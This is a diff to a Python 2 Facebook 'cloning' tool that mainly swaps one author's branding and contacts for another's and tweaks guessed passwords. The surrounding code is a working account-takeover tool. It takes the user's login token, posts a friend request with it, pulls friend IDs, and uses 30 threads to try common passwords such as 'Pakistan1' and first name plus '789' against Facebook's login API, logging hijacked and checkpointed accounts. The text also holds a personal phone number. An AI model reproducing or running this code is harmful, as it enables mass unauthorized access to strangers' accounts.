@@ -1,5 +1,8 @@
 #!/usr/bin/python2
 #coding=utf-8
+#The Credit For This Code Goes To Omi Chaudhary
+#If You Wanna Take Credits For This Code, Please Look Yourself Again...
+#Reserved2020
 
 
 import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
@@ -48,21 +51,16 @@ def jalan(z):
 
 ##### LOGO #####
 logo = """
-  \033[1;97m,ad8888ba,   88b           d88  88  
- \033[1;97md8"'    `"8b  888b         d888  88  
-\033[1;92md8'        `8b 88`8b       d8'88  88  
-\033[1;92m88          88 88 `8b     d8' 88  88  
-\033[1;92m88          88 88  `8b   d8'  88  88  
-\033[1;92mY8,        ,8P 88   `8b d8'   88  88  
- \033[1;92mY8a.    .a8P  88    `888'    88  88  
-  \033[1;92m`"Y8888Y"'   88     `8'     88  88
-
+     ____             __              
+    / __ \__  _______/ /_  ____ _____ 
+   / / / / / / / ___/ __ \/ __ `/ __ \
+  / /_/ / /_/ / /  / /_/ / /_/ / / / /
+  \___\_\__,_/_/  /_.___/\__,_/_/ /_/ 
+                                    
 \033[1;97m●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\033[1;92m๑۩۩๑\033[1;97m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●
-\033[1;97mAuthor©\033[1;97m: \033[1;92mOmi Chaudhary
-\033[1;97mInstagram\033[1;97m: \033[1;92mhttps://www.Instagram.com/Omi6t
-\033[1;97mFacebook\033[1;97m: \033[1;92mhttps://www.facebook.com/Omi6t
-\033[1;97mWhatsapp\033[1;97m: \033[1;92m+923117675174
-\033[1;97m«--------------------\033[1;92m✧\033[1;97m--------------------»"""
+\033[1;97mOwner\033[1;97m: \033[1;92mQurban Yousafzai
+\033[1;97mYoutube\033[1;97m: \033[1;92mTechnical Wahab
+\033[1;97m____________________.._____________________"""
 
 def tik():
 	titik = ['.   ','..  ','... ']
@@ -87,29 +85,27 @@ print  """
   \033[1;97m\ V  V / | |___| |__\033[1;92m| |__| |_| | |  | | |___ 
    \033[1;97m\_/\_/  |_____|_____\033[1;92m\____\___/|_|  |_|_____|
 \033[1;97m●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\033[1;92m๑۩۩๑\033[1;97m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●
-\033[1;97mAuthor©\033[1;97m: \033[1;92mOmi Chaudhary
-\033[1;97mInstagram\033[1;97m: \033[1;92mhttps://www.Instagram.com/Omi6t
-\033[1;97mFacebook\033[1;97m: \033[1;92mhttps://www.facebook.com/Omi6t
-\033[1;97mWhatsapp\033[1;97m: \033[1;92m+923117675174
-\033[1;97m«--------------------\033[1;92m✧\033[1;97m--------------------»"""
+\033[1;97mOwner\033[1;97m: \033[1;92mQurban Yousafzai
+\033[1;97mYoutube\033[1;97m: \033[1;92mTechnical Wahan
+\033[1;97m____________________.._____________________"""
 
-CorrectUsername = "Omi6t"
-CorrectPassword = "Omi"
+CorrectUsername = "Qurban"
+CorrectPassword = "Qurban"
 
 loop = 'true'
 while (loop == 'true'):
-    username = raw_input("\033[1;96m🔐 \x1b[1;93mTool Username \x1b[1;93m»» \x1b[1;96m")
+    username = raw_input("\x1b[1;93mTool Username \x1b[1;93m»» \x1b[1;96m")
     if (username == CorrectUsername):
-    	password = raw_input("\033[1;96m🔐 \x1b[1;93mTool Password \x1b[1;93m»» \x1b[1;96m")
+    	password = raw_input("\x1b[1;93mTool Password \x1b[1;93m»» \x1b[1;96m")
         if (password == CorrectPassword):
             print "Logged in successfully as " + username
             loop = 'false'
         else:
             print "\033[1;91mWrong Password"
-            os.system('xdg-open https://www.Facebook.com/Omi6t')
+            os.system('xdg-open https://www.youtube.com/channel/UCij7zU_cP7q6mgoaWB6vavg')
     else:
         print "\033[1;91mWrong Username"
-        os.system('xdg-open https://www.Facebook.com/Omi6t')
+        os.system('xdg-open https://www.youtube.com/channel/UCij7zU_cP7q6mgoaWB6vavg')
 
 def login():
 	os.system('clear')
@@ -119,11 +115,8 @@ def login():
 	except (KeyError,IOError):
 		os.system('clear')
 		print logo
-		jalan(' \033[1;91mWarning: \033[1;97mDo Not Use Your Personal Account' )
-		jalan('          \033[1;97mUse a Fresh Account To Login' )
-		print "\033[1;97m«--------------------\033[1;92m✧\033[1;97m--------------------»"
-		print('	   \033[1;95m【\x1b[1;95mLOGIN WITH FACEBOOK\x1b[1;95m】' )
-		print('	' )
+		print(' \033[1;91mWarning: \033[1;97mDo Not Use Your Personal Account' )
+		print "\033[1;97m____________________.._____________________"
 		id = raw_input('\033[1;96m[+] \x1b[1;93mID/Email\x1b[1;93m: \x1b[1;96m')
 		pwd = raw_input('\033[1;96m[+] \x1b[1;93mPassword\x1b[1;93m: \x1b[1;96m')
 		tik()
@@ -153,7 +146,7 @@ def login():
 				unikers.write(z['access_token'])
 				unikers.close()
 				print '\n\x1b[1;92mLogin Successful...'
-				os.system('xdg-open https://www.Facebook.com/Omi6t')
+				os.system('xdg-open https://www.youtube.com/channel/UCij7zU_cP7q6mgoaWB6vavg')
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
 				menu()
 			except requests.exceptions.ConnectionError:
@@ -197,17 +190,16 @@ def menu():
 		keluar()
 	os.system("clear")
 	print logo
-	print "  \033[1;97m«---------\033[1;95mLogged in User Info\033[1;97m---------»"
 	print "	   \033[1;93m Name\033[1;93m:\033[1;97m"+nama+"\033[1;97m               "
 	print "	   \033[1;93m ID\033[1;93m:\033[1;97m"+id+"\x1b[1;97m              "
-	print "\033[1;97m«--------------------\033[1;92m✧\033[1;97m--------------------»"
+	print "\033[1;97m____________________.._____________________"
 	print "\033[1;97m--\033[1;92m> \033[1;92m1.\x1b[1;92mStart Cloning..."
 	print "\033[1;97m--\033[1;91m> \033[1;91m0.\033[1;91mExit            "
 	pilih()
 
 
 def pilih():
-	unikers = raw_input("\n\033[1;97mChoose an Option>>> \033[1;97m")
+	unikers = raw_input("\n\033[1;97mYour Choice>>> \033[1;97m")
 	if unikers =="":
 		print "\x1b[1;91mFill in correctly"
 		pilih()
@@ -240,14 +232,14 @@ def super():
 	pilih_super()
 
 def pilih_super():
-	peak = raw_input("\n\033[1;97mChoose an Option>>> \033[1;97m")
+	peak = raw_input("\n\033[1;97mYour Choice>>> \033[1;97m")
 	if peak =="":
 		print "\x1b[1;91mFill in correctly"
 		pilih_super()
 	elif peak =="1":
 		os.system('clear')
 		print logo
-		print "\033[1;97m«--------------------\033[1;92m✧\033[1;97m--------------------»"
+		print "\033[1;97m____________________.._____________________"
 		jalan('\033[1;93mGetting IDs \033[1;97m...')
 		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
 		z = json.loads(r.text)
@@ -257,7 +249,7 @@ def pilih_super():
 		os.system('clear')
 		print logo
 		idt = raw_input("\033[1;96m[+] \033[1;93mEnter ID\033[1;93m: \033[1;97m")
-		print "\033[1;97m«--------------------\033[1;92m✧\033[1;97m--------------------»"
+		print "\033[1;97m____________________.._____________________"
 		try:
 			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
 			op = json.loads(jok.text)
@@ -283,9 +275,6 @@ def pilih_super():
 	for o in titik:
 		print("\r\033[1;93mCloning\033[1;93m"+o),;sys.stdout.flush();time.sleep(1)
 	print "\n\033[1;97m«-----\x1b[1;91m【To Stop Process Press CTRL+Z】\033[1;97m----»"
-	print "\033[1;97m«--------------------\033[1;92m✧\033[1;97m--------------------»"
-	jalan(' \033[1;93mPlz Wait Cloned Accounts Will Appear Here')
-	print "\033[1;97m«--------------------\033[1;92m✧\033[1;97m--------------------»"
 	
 			
 	def main(arg):
@@ -298,7 +287,7 @@ def pilih_super():
 		try:
 			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
 			b = json.loads(a.text)
-			pass1 = ('786786')
+			pass1 = ('786789')
 			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 			q = json.load(data)
 			if 'access_token' in q:
@@ -340,7 +329,7 @@ def pilih_super():
 									cek.close()
 									cekpoint.append(user+pass3)
 								else:
-									pass4 = 'Pakistan'
+									pass4 = 'Pakistan1'
 									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 									q = json.load(data)
 									if 'access_token' in q:
@@ -384,7 +373,7 @@ def pilih_super():
 														else:
 															a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
 															b = json.loads(a.text)
-															pass7 = b['first_name'] + '786'
+															pass7 = b['first_name'] + '789'
 															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 															q = json.load(data)
 															if 'access_token' in q:
@@ -404,7 +393,7 @@ def pilih_super():
 		
 	p = ThreadPool(30)
 	p.map(main, id)
-	print "\033[1;97m«--------------------\033[1;92m✧\033[1;97m--------------------»"
+	print "\033[1;97m____________________.._____________________"
 	print "  \033[1;91m«---------Developed By Omi------------»"
 	print '\033[1;92mProcess Has Been Completed\033[1;92m....'
 	print"\033[1;92mTotal OK/\x1b[1;93mCP \033[1;91m: \033[1;92m"+str(len(oks))+"\033[1;97m/\033[1;93m"+str(len(cekpoint))
